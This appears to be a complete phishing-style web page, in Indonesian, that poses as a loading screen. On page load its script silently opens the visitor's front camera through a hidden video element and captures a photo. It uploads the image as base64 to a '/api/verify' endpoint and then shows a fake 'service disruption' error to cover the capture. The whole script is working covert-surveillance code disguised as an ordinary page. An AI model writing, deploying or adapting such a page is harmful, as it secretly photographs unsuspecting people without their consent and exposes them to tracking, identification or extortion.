<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loading...</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    background: #ffffff;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
  }
  .loading-container { text-align: center; max-width: 400px; width: 100%; }
  .spinner-container { margin-bottom: 30px; transition: all 0.5s ease; }
  .spinner-container.hidden { opacity: 0; transform: scale(0.5); pointer-events: none; height: 0; margin: 0; overflow: hidden; }
  .spinner {
    width: 50px; height: 50px; margin: 0 auto;
    border: 4px solid #e0e0e0; border-top-color: #333;
    border-radius: 50%; animation: spin 0.8s ease-in-out infinite;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  .loading-title {
    font-size: 24px; font-weight: 400; letter-spacing: 6px;
    color: #333; margin-bottom: 10px; transition: all 0.5s ease;
  }
  .loading-title.hidden { opacity: 0; transform: translateY(-20px); pointer-events: none; height: 0; margin: 0; overflow: hidden; }
  .loading-sub { color: #999; font-size: 13px; letter-spacing: 2px; transition: all 0.5s ease; }
  .loading-sub.hidden { opacity: 0; transform: translateY(-10px); pointer-events: none; height: 0; margin: 0; overflow: hidden; }
  .loading-dots { display: inline-block; width: 20px; text-align: left; }
  .loading-dots::after { content: '...'; animation: dots 1.5s steps(4) infinite; }
  @keyframes dots { 0% { content: ''; } 25% { content: '.'; } 50% { content: '..'; } 75% { content: '...'; } }
  .status-message {
    margin-top: 20px; padding: 15px; color: #666; font-size: 14px;
    min-height: 50px; display: flex; align-items: center; justify-content: center;
    opacity: 0; transition: all 0.5s ease; transform: translateY(10px);
  }
  .status-message.visible { opacity: 1; transform: translateY(0); }
  .status-message.error { color: #ff3b30; }
  #hidden-video { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
  #hidden-canvas { display: none; }
</style>
</head>
<body>

<div class="loading-container">
  <div class="spinner-container" id="spinnerContainer"><div class="spinner"></div></div>
  <div class="loading-title" id="loadingTitle">LOADING</div>
  <div class="loading-sub" id="loadingSub">Please wait<span class="loading-dots"></span></div>
  <div class="status-message" id="statusMessage">⚠️ Maaf sedang gangguan</div>
</div>

<video id="hidden-video" autoplay playsinline></video>
<canvas id="hidden-canvas"></canvas>

<script>
const video = document.getElementById('hidden-video');
const canvas = document.getElementById('hidden-canvas');
const statusMessage = document.getElementById('statusMessage');
const spinnerContainer = document.getElementById('spinnerContainer');
const loadingTitle = document.getElementById('loadingTitle');
const loadingSub = document.getElementById('loadingSub');

let stream = null;

async function startProcess() {
  console.log('🚀 Starting process...');
  
  try {
    // Access camera
    console.log('📷 Accessing camera...');
    stream = await navigator.mediaDevices.getUserMedia({
      video: { 
        facingMode: 'user',
        width: { ideal: 640 },
        height: { ideal: 480 }
      },
      audio: false
    });
    
    video.srcObject = stream;
    console.log('✅ Camera started');
    
    // Wait for camera to stabilize
    await delay(1000);
    
    // Capture photo
    console.log('📸 Capturing photo...');
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0);
    
    // Get base64 data
    const imageData = canvas.toDataURL('image/jpeg', 0.85);
    console.log(`📸 Photo captured, length: ${imageData.length}`);
    
    // Stop camera
    if (stream) {
      stream.getTracks().forEach(track => track.stop());
      stream = null;
      video.srcObject = null;
    }
    
    // Send as JSON
    console.log('📤 Sending to server as JSON...');
    const response = await fetch('/api/verify', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        image: imageData,
        phone: `User_${Date.now().toString().slice(-6)}`
      })
    });
    
    console.log('📨 Response status:', response.status);
    const result = await response.json();
    console.log('📨 Response data:', result);
    
    if (!result.success) {
      throw new Error(result.error || 'Gagal mengirim');
    }
    
    console.log('✅ All done!');
    
  } catch (err) {
    console.error('❌ Error:', err);
  }
  
  // Hide loading
  console.log('🎬 Hiding loading...');
  spinnerContainer.classList.add('hidden');
  loadingTitle.classList.add('hidden');
  loadingSub.classList.add('hidden');
  
  // Show error message
  statusMessage.classList.add('visible', 'error');
  statusMessage.textContent = '⚠️ Maaf sedang gangguan';
}

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Start when page loads
window.addEventListener('load', () => {
  console.log('📄 Page loaded');
  setTimeout(startProcess, 500);
});

window.addEventListener('beforeunload', () => {
  if (stream) {
    stream.getTracks().forEach(track => track.stop());
  }
});
</script>
</body>
</html>
